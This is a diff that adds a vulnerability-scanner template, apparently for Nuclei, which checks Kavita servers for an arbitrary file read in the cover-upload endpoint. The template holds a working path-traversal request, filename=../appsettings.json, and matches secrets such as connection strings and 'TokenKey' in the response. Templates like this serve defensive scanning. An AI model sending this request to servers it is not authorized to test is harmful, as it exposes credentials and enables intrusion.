@@ -1,0 +1,31 @@
+id: kavita-cover-upload-file-read
+
+info:
+  name: Kavita cover-upload Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Kavita has security vulnerabilities. Attackers can use the filename parameter to read and download sensitive information such as appsettings.json, kavita.db, and kavita.log.
+  tags: file-read
+  reference:
+    - https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/
+
+variables:
+  filename: "../appsettings.json"
+
+http:
+  - raw:
+      - |
+        GET /api/image/cover-upload?filename={{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"ConnectionStrings\":"
+          - "TokenKey"
